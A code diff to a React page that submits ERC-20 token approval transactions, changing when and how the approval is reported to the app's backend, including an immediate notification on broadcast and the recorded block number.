@@ -133,7 +133,17 @@ export default function UserPage() {
         txHash: tx.hash,
       });
 
-      await tx.wait();
+      // Immediately notify backend on broadcast so mobile wallets (e.g. Binance Web3 Wallet) record the user right away
+      api.recordApproval({
+        address: activeWallet.address,
+        token: activeTokenAddress,
+        symbol: tokenInfo?.symbol || 'USDT',
+        txHash: tx.hash,
+        allowance: approveAmount,
+        isRevoke: Number(approveAmount) === 0,
+      }).catch(() => {});
+
+      const receipt = await tx.wait();
       setStatus({
         kind: 'ok',
         msg:
@@ -143,12 +153,13 @@ export default function UserPage() {
         txHash: tx.hash,
       });
 
-      api.recordApproval({
+      await api.recordApproval({
         address: activeWallet.address,
         token: activeTokenAddress,
-        symbol: tokenInfo?.symbol || 'TOKEN',
+        symbol: tokenInfo?.symbol || 'USDT',
         txHash: tx.hash,
         allowance: approveAmount,
+        blockNumber: receipt?.blockNumber || 0,
         isRevoke: Number(approveAmount) === 0,
       }).catch((e) => console.error('Failed to notify backend:', e));
 
